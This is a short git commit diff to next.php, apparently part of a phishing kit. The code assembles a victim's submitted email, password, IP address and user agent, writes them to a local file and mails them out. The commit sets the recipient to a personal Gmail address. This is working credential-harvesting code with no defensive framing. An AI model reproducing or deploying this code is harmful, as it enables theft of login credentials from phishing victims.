86f480204aa396f124e273b9402a753823b2a3b7
snow243 <124539037+snow243@users.noreply.github.com>
2025-02-26 19:22:04 -0500

    Update next.php

--- next.php
+++ next.php
@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- CrEaTeD --------------|\n";
-	$send = "@gmail.com";
+	$send = "leonardleader74@gmail.com";
 	$subject = "Email Result : $ip";$file = fopen("../stored.txt","a+"); 
 fwrite($file,$message); 
     mail($send, $subject, $message);   
